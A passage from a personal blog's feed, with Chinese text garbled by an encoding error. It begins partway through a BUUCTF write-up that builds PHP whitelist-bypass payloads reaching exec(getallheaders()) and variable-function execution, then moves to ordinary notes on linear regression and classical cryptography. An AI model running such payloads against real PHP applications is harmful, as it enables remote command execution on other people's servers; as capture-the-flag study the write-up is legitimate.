class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">å³ exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‡ ç‚¹è¯´æ˜</p><p>getallheaders â€” è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>å½“å–æ•°ç»„å…ƒç´ æ—¶ï¼Œç”¨å¤§æ‹¬å·ä¼šæŠ›å‡ºè­¦å‘Šè€Œä¸æ˜¯é”™è¯¯</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>ç”¨ä¸Šè¿°payload åŠ ä¸Š postmanæ”¹ä¸‹headerså³å¯å‘½ä»¤æ‰§è¡Œgetflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ"><a href="#å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ"></a>å­—ç¬¦ä¸²å¼‚æˆ–å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>å‘ç°ä¿©èƒ½ç”¨çš„</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google newsï¼šèšç±»ç®—æ³•ï¼Œæ— ç›‘ç£å­¦ä¹ ç®—æ³•</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>èšç±»ç®—æ³•æ˜¯unsupervised learningçš„ä¸€ç§</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-æ¨¡å‹æè¿°"><a href="#2-1-æ¨¡å‹æè¿°" class="headerlink" title="2-1.æ¨¡å‹æè¿°"></a>2-1.æ¨¡å‹æè¿°</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>æ ¹æ®æ‹ŸåˆçŠ¶å†µé¢„ä¼°æˆ¿ä»·ï¼Œæ˜¯ä¸€ä¸ªsupervised learning problemï¼Œå› ä¸ºæ¯ä¸€ä¸ªå¤§å°éƒ½æœ‰ä¸€ä¸ªâ€œæ­£ç¡®çš„ç­”æ¡ˆâ€ï¼Œå¹¶ä¸”è¿˜æ˜¯å›å½’é—®é¢˜ã€‚</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = â€œinputâ€ variable / features</li><li><p>y = â€œoutputâ€ variable / â€œtargetâ€ variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means â€œindexâ€)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2ä»£ä»·å‡½æ•°-ä¸€"><a href="#2-2ä»£ä»·å‡½æ•°-ä¸€" class="headerlink" title="2.2ä»£ä»·å‡½æ•°(ä¸€)"></a>2.2ä»£ä»·å‡½æ•°(ä¸€)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3ä»£ä»·å‡½æ•°-äºŒ"><a href="#2-3ä»£ä»·å‡½æ•°-äºŒ" class="headerlink" title="2.3ä»£ä»·å‡½æ•°(äºŒ)"></a>2.3ä»£ä»·å‡½æ•°(äºŒ)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>ç®€åŒ–ä»£ä»·å‡½æ•°ä½¿å¾—$\theta_0 = 0$ï¼Œç†è§£ä»£ä»·å‡½æ•°</p><p>å¯¹äºä¸Šå›¾ç‰¹æ®Šçš„training setï¼Œå¯ä»¥æ‰¾å‡º$\theta_1 = 1$æ—¶ï¼Œå¯ä»¥å®Œç¾æ‹Ÿåˆ</p><h2 id="2-4ä»£ä»·å‡½æ•°-ä¸‰"><a href="#2-4ä»£ä»·å‡½æ•°-ä¸‰" class="headerlink" title="2.4ä»£ä»·å‡½æ•°(ä¸‰)"></a>2.4ä»£ä»·å‡½æ•°(ä¸‰)</h2><p>å½“æˆ‘ä»¬ä½¿ç”¨$\theta_0$å’Œ$\theta_1$æ—¶ï¼Œå¾—åˆ°cost functionå›¾åƒç±»ä¼¼ä¸‹å›¾</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>ä½¿ç”¨ç­‰é«˜çº¿çš„æ–¹å¼æ¥æ¨¡æ‹Ÿï¼Œæƒ³è±¡ä»ç¢—çš„ä¸Šæ–¹å‘åº•éƒ¨çœ‹ï¼Œminimize J($\theta_0$,$\theta_1$) å°±æ˜¯æ¤­åœ†çš„ä¸­å¿ƒï¼Œå¦‚ä¸‹å›¾çš„æ•°æ®æ‹Ÿåˆè¾ƒä¸ºä¸é”™ï¼Œcost valueå¯ä»¥æ¥å—</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p><h2 id="2-5-æ¢¯åº¦ä¸‹é™"><a href="#2-5-æ¢¯åº¦ä¸‹é™" class="headerlink" title="2.5 æ¢¯åº¦ä¸‹é™"></a>2.5 æ¢¯åº¦ä¸‹é™</h2><p>Repeat until convergence{</p><p>â€‹    $\theta_j := \theta_j - \alpha\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)  $        (for j = 0 and j = 1) </p><p>}</p><p>// := assignment       ( a := a + 1)</p><p>// $\alpha$ä¸ºå­¦ä¹ ç‡ï¼Œå¤§çš„æ—¶å€™ä¸‹å±±æ­¥å­å¤§</p><p><img src="https://i.loli.net/2021/03/09/gQYal6ocdpKqC9R.png" alt="æ¢¯åº¦ä¸‹é™1.png" style="zoom:50%;" /></p><h2 id="2-6-æ¢¯åº¦ä¸‹é™ç†è§£"><a href="#2-6-æ¢¯åº¦ä¸‹é™ç†è§£" class="headerlink" title="2.6 æ¢¯åº¦ä¸‹é™ç†è§£"></a>2.6 æ¢¯åº¦ä¸‹é™ç†è§£</h2><ul><li>æ¢¯åº¦ä¸‹é™å¯¼æ•°é¡¹çš„æ„ä¹‰</li></ul><p><img src="https://i.loli.net/2021/03/09/CyXR7G4TLIKQO1w.png" alt="æ¢¯åº¦ä¸‹é™2.png" style="zoom:50%;" /></p><ul><li>æ¢¯åº¦ä¸‹é™å­¦ä¹ ç‡å¤§å°çš„æ„ä¹‰</li></ul><p><img src="https://i.loli.net/2021/03/09/N1mFSpIkrPAnljb.png" alt="æ¢¯åº¦ä¸‹é™3-alphaå«ä¹‰.png" style="zoom:50%;" /></p><ul><li>æ¢¯åº¦ä¸‹é™åˆ°å±€éƒ¨æœ€ä¼˜ç‚¹çš„ç»“æœ</li></ul><p><img src="https://i.loli.net/2021/03/09/nSg2xDTV7yROecG.png" alt="æ¢¯åº¦ä¸‹é™4-å±€éƒ¨æœ€ä¼˜ç‚¹çš„ç»“æœ.png" style="zoom:50%;" /></p><h2 id="2-7-çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™"><a href="#2-7-çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™" class="headerlink" title="2.7 çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™"></a>2.7 çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™</h2><p>æ¢¯åº¦ä¸‹é™ä¸­å¯¼æ•°é‚£ä¸€é¡¹ï¼š</p><script type="math/tex; mode=display">\frac\partial{\partial\theta_j}J(\theta_0,\theta_1) = \frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})^2 \\=\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(\theta_0 + \theta_1x^{i}-y^{(i)})^2</script><p>$\theta_0$å’Œ$\theta_1$æƒ…å†µä¸‹çš„åå¯¼æ•°ï¼š</p><script type="math/tex; mode=display">j=0:\frac\partial{\partial\theta_0}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)}) \\j=1:\frac\partial{\partial\theta_1}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})*x^{(i)}</script><p>è¯¥æ–¹æ³•æ˜¯Batchæ¢¯åº¦ä¸‹é™æ³•ï¼šéœ€è¦éå†æ•´ä¸ªè®­ç»ƒé›†</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦ç¬”è®°</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€-å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç "><a href="#ä¸€-å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç " class="headerlink" title="ä¸€.å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç "></a>ä¸€.å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç </h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><strong>å¯†ç ç¼–ç å­¦</strong>å’Œå¯†ç åˆ†æå­¦</p><blockquote><p>Plaintext:æ˜æ–‡ï¼Œè¢«éšè”½æ¶ˆæ¯ï¼ŒM</p><p>Ciphertext:å¯†æ–‡ï¼ŒC</p><p>Encryption:åŠ å¯†</p><p>Decryption:è§£å¯†ï¼ŒåŠ å¯†çš„é€†è¿‡ç¨‹</p><p>Encryption algorithm: åŠ å¯†ç®—æ³•ï¼ŒE()</p><p>Decryption algorithm: è§£å¯†ç®—æ³•ï¼ŒD()</p><p>Key: å¯†é’¥ï¼Œæ§åˆ¶åŠ å¯†å’Œè§£å¯†ç®—æ³•æ“ä½œçš„æ•°æ®å¤„ç†ï¼Œåˆ†åˆ«ç§°ä½œåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ï¼Œk</p></blockquote><ul><li>ä¼ ç»Ÿå¯†ç ä½“åˆ¶æ‰€ç”¨çš„åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ç›¸åŒæˆ–<strong>å®è´¨ä¸Šç­‰åŒ</strong>ï¼Œä»ä¸€ä¸ªæ˜“äºæ¨å‡ºå¦ä¸€ä¸ªï¼šå•é’¥æˆ–å¯¹ç§°å¯†ç ä½“åˆ¶ï¼Œæ— æ³•å®ç°ä¸å¯å¦è®¤æ€§</li><li>åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ä¸ç›¸åŒï¼Œä»ä¸€ä¸ªéš¾äºæ¨å‡ºå¦ä¸€ä¸ªï¼ŒåŒé’¥ï¼Œæˆ–éå¯¹ç§°å¯†ç ä½“åˆ¶</li></ul><p>å¯†ç ä½“ç³»æ˜¯ä¸€ä¸ªäº”å…ƒç»„(M C K E D)</p><p>å¯†é’¥ç©ºé—´Kï¼Œåœ¨å•é’¥ä½“åˆ¶ä¸‹K1 = K2 = K</p><p>åŠ å¯†å˜æ¢$E_{k1}$</p><p>è§£å¯†å˜æ¢$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)ä¸ºä¿å¯†é€šä¿¡ç³»ç»Ÿ</strong></p><p>å¯†ç åˆ†æè€…ï¼Œé€‰å®šå˜æ¢å‡½æ•°hï¼Œå¯¹cè¿›è¡Œå˜æ¢ï¼Œå¾—åˆ°çš„æ˜æ–‡æ˜¯æ˜æ–‡ç©ºé—´ä¸­çš„æŸä¸ªå…ƒç´ ï¼Œ</p><p>å³$mâ€™ = h(x)$</p><p>å¦‚æœmâ€™ = mï¼Œåˆ™åˆ†ææˆåŠŸ</p><h3 id="ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚"><a href="#ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚" class="headerlink" title="ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚"></a>ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚</h3><ol><li>ç†è®ºä¸Šä¸å¯ç ´ï¼Œå³ $ p_r{mâ€™=m}=0 $ï¼Œå½“çŸ¥é“å·²çŸ¥çš„æ˜æ–‡å¯†æ–‡æ—¶ï¼Œè¦å†³å®šå¯†é’¥æˆ–ä»»æ„æ˜æ–‡åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„</li><li>KerchhoffåŸåˆ™ï¼Œä¿å¯†æ€§ä¸ä¾èµ–äºåŠ å¯†ä½“åˆ¶æˆ–ç®—æ³•çš„ä¿å¯†ï¼Œè€Œä¾èµ–äºå¯†é’¥</li><li>åŠ å¯†è§£å¯†ç®—æ³•é€‚ç”¨äºæ‰€æœ‰å¯†é’¥ç©ºé—´ä¸­çš„å…ƒç´ </li><li>ç³»ç»Ÿä¾¿äºå®ç°å’Œä½¿ç”¨</li></ol><h3 id="å¯†ç ç³»ç»Ÿçš„æ”»å‡»"><a href="#å¯†ç ç³»ç»Ÿçš„æ”»å‡»" class="headerlink" title="å¯†ç ç³»ç»Ÿçš„æ”»å‡»"></a>å¯†ç ç³»ç»Ÿçš„æ”»å‡»</h3><ul><li>æƒŸå¯†æ–‡æ”»å‡»</li><li>å·²çŸ¥æ˜æ–‡æ”»å‡»</li><li>é€‰æ‹©æ˜æ–‡æ”»å‡»</li><li>é€‰æ‹©å¯†æ–‡æ”»å‡»</li></ul><div class="table-container"><table><thead><tr><th>æ”»å‡»ç±»å‹</th><th style="text-align:left">æ”»å‡»è€…æŒæ¡çš„å†…å®¹</th><th></th></tr></thead><tbody><tr><td>æƒŸå¯†æ–‡æ”»å‡»</td><td style="text-align:left">åŠ å¯†ç®—æ³•ï¼Œæˆªè·çš„éƒ¨åˆ†å¯†æ–‡</td><td></td></tr><tr><td>å·²çŸ¥æ˜æ–‡æ”»å‡»</td><td style="text-align:left">ä»¥ä¸ŠåŠä¸€ä¸ªæˆ–å¤šä¸ªæ˜æ–‡å¯†æ–‡å¯¹</td><td></td></tr><tr><td>é€‰æ‹©æ˜æ–‡æ”»å‡»</td><td style="text-align:left">è‡ªå·±é€‰æ‹©çš„æ˜æ–‡æ¶ˆæ¯åŠç”±å¯†é’¥äº§ç”Ÿçš„å¯†æ–‡</td><td></td></tr><tr><td>é€‰æ‹©å¯†æ–‡æ”»å‡»</td><td style="text-align:left">è‡ªå·±é€‰æ‹©çš„å¯†æ–‡æ¶ˆæ¯åŠç›¸åº”çš„è¢«è§£å¯†çš„æ˜æ–‡</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>æ— æ¡ä»¶å®‰å…¨ï¼šæ— è®ºæ•Œæ‰‹æˆªè·å¤šå°‘å¯†æ–‡ï¼ŒèŠ±è´¹å¤šé•¿æ—¶é—´éƒ½ä¸èƒ½è§£å¯†å¯†æ–‡ ï¼ˆä¸€æ¬¡ä¸€å¯†</p><p>è®¡ç®—ä¸Šå®‰å…¨ï¼š1ï¼Œç ´è¯‘å¯†æ–‡çš„ä»£ä»·è¶…è¿‡è¢«åŠ å¯†ä¿¡æ¯çš„ä»·å€¼ã€‚2ï¼Œç ´è¯‘å¯†æ–‡æ‰€èŠ±çš„æ—¶é—´è¶…è¿‡ä¿¡æ¯çš„æœ‰ç”¨æœŸã€‚</p><h2 id="å¯†ç å­¦å‘å±•"><a href="#å¯†ç å­¦å‘å±•" class="headerlink" title="å¯†ç å­¦å‘å±•"></a>å¯†ç å­¦å‘å±•</h2><p>Cryptology - å¯†ç å­¦</p><blockquote><p>ä¸‰ä¸ªé˜¶æ®µï¼š</p><p>1.1949ä¹‹å‰ï¼šå¤å…¸å¯†ç  è‰ºæœ¯</p><p>2.1949-1975ï¼šè¿‘ä»£å¯†ç  è‰ºæœ¯-&gt;ç§‘å­¦</p><p>3.1976å¹´è‡³ä»Šï¼šç°ä»£å¯†ç </p></blockquote><p>å¤å…¸å¯†ç ï¼š</p><ol><li>æ–¯å·´è¾¾æ£ã€‚ç®—æ³•æ˜¯ç¼ ç»•ï¼Œå¯†é’¥æ˜¯æ£å­çš„ç²—ç»†ã€‚</li><li>å•è¡¨ä»£æ¢å¯†ç ï¼šå‡¯æ’’å¯†ç ï¼Œå•å­—æ¯ä»£æ¢ã€‚ç®—æ³•æ˜¯ä»£æ¢ï¼Œå¯†é’¥æ˜¯å¯†ç è¡¨ã€‚</li><li>å¤šè¡¨ä»£æ¢å¯†ç ï¼šEnigmaå¯†ç æœºã€‚</li></ol><p>è¿‘ä»£å¯†ç ï¼š</p><ol><li>1977å¹´ï¼ŒNBSé¢å¸ƒé‡‡çº³IBMè®¾è®¡çš„æ–¹æ¡ˆä½œä¸ºéæœºå¯†æ•°æ®çš„æ•°æ®åŠ å¯†æ ‡å‡†DESï¼ŒData Encryption Standardã€‚</li><li>2001.11.16ï¼Œé‡‡ç”¨AESç®—æ³•</li><li>1976ï¼ŒW.Diffieï¼ŒM.E.Hellmanï¼Œæå‡ºéå¯¹ç§°å¯†ç ç®—æ³•æ€æƒ³</li><li>1977ï¼ŒRivestï¼ŒShamirï¼ŒAdlemanæå‡ºRSAå¯†ç ä½“åˆ¶</li></ol><p>å…¬é’¥å¯†ç å­¦å®ç°åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥çš„åˆ†ç¦»ï¼Œä¼Ÿå¤§é©å‘½ï¼Œä½¿ç”¨ä¸¤ä¸ªå¯†é’¥ï¼šå…¬é’¥ï¼Œç§é’¥</p><h2 id="ä»¿å°„å˜æ¢"><a href="#ä»¿å°„å˜æ¢" class="headerlink" title="ä»¿å°„å˜æ¢"></a>ä»¿å°„å˜æ¢</h2><p>$c = E_{a,b}(m) \equiv am + b(mod26)$</p><p>$m = D_{a,b}(c) \equiv a^{-1} + (c - b)(mod26)$</p><p>å½“aå’Œ26äº’ä¸ºç´ æ•°çš„æ—¶å€™æ‰å¯ä»¥è§£å¯† æœ€å¤§å…¬å› å­ä¸º1æ—¶æ‰äº’ä¸ºç´ æ•° ï¼ˆä¸äº’ç´ çš„è¯é€†å…ƒæ±‚ä¸å‡ºæ¥ï¼Œå°±æ²¡æ³•è§£å¯†</p><p>abä¸ºå¯†é’¥</p><p>$a^{-1}$ä¸ºaçš„é€†å…ƒ</p><h3 id="å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹"><a href="#å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹" class="headerlink" title="å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹"></a>å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹</h3><p>é¢‘æ¬¡é—®é¢˜</p><p>ç›¸å¯¹ä½ç½®é—®é¢˜</p><h2 id="ç»´å‰å°¼äºšå¯†ç "><a href="#ç»´å‰å°¼äºšå¯†ç " class="headerlink" title="ç»´å‰å°¼äºšå¯†ç "></a>ç»´å‰å°¼äºšå¯†ç </h2><p>åŠ å¯†ç®—æ³•</p><p>$c<em>{i+td}=E_k(m</em>{i+td})\equiv(m_{i+td}+k_i)(mod q)$</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>1.ç†è§£ä¿å¯†é€šä¿¡ç³»ç»Ÿæ¨¡å‹</p><p>2.å¯†ç ä½“åˆ¶ä»åŸç†åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œå•é’¥å’ŒåŒé’¥ä½“åˆ¶</p><p>3.åŠ å¯†ç®—æ³•ä¸¤æ¡å®‰å…¨å‡†åˆ™</p><p>4.èƒ½å¤Ÿè®¡ç®—ä»¿å°„å˜æ¢</p><p>5.ç½®æ¢å¯†ç çš„æ“ä½œ</p><h1 id="äºŒ-å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†"><a href="#äºŒ-å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†" class="headerlink" title="äºŒ.å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†"></a>äºŒ.å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†</h1><h2 id="1-ç´ æ•°å’Œäº’ç´ "><a href="#1-ç´ æ•°å’Œäº’ç´ " class="headerlink" title="1.ç´ æ•°å’Œäº’ç´ "></a>1.ç´ æ•°å’Œäº’ç´ </h2><ul><li><p>å› å­</p><ul><li>bèƒ½æ•´é™¤aï¼Œb|a : bæ˜¯açš„å› å­</li><li>b|1    b = $\pm$1</li><li>b|a a|b åˆ™ a=$\pm$b</li><li>b|a  b|c. åˆ™å¯¹äºä»»æ„æ•´æ•°må’Œn  -&gt; b|(am+cn)</li></ul></li><li><p>ç´ æ•°</p><ul><li>ç´ æ•°æ˜¯ç°ä»£æ•°è®ºçš„æ ¸å¿ƒå†…å®¹</li><li>pçš„å› å­åªæœ‰ $\pm$1å’Œ $\pm$p</li><li>æ•´æ•°åˆ†è§£çš„å”¯ä¸€æ€§å®šç† ä»»ä¸€æ­£æ•´æ•°å¯ä»¥å”¯ä¸€åˆ†è§£æˆç´ æ•°çš„ä¹˜ç§¯<ul><li>$a = p_1^{e_1} + p_2^{e_2} + â€¦ + p_t^{e_t}$</li><li>$e_i$æ˜¯æ­£æ•´æ•° $p_i$æ˜¯ç´ æ•°</li></ul></li></ul></li><li><p>äº’ç´ æ•° </p><ul><li>cæ˜¯aå’Œbçš„æœ€å¤§å…¬å› å­ c=gcd(a,b)</li><li>å› ä¸ºæ‰€æœ‰ä¸ä¸º0çš„æ•´æ•°éƒ½æ˜¯0çš„å› å­ï¼Œå› æ­¤ï¼Œgcd(a,0) = |a|</li><li><p>å¦‚æœgcd(a,b) = 1ï¼Œåˆ™ç§°aï¼Œbæ˜¯äº’ç´ çš„</p></li><li><p>æœ€å°å…¬å€æ•° lcmã€‚dæ˜¯aå’Œbçš„æœ€å°å…¬å€æ•°ï¼Œd=lcm(a,b)</p></li><li>è‹¥gcd(a,b) = 1ï¼Œåˆ™lcm(a,b) = a * b</li></ul></li></ul><h2 id="2-æ¨¡è¿ç®—"><a href="#2-æ¨¡è¿ç®—" class="headerlink" 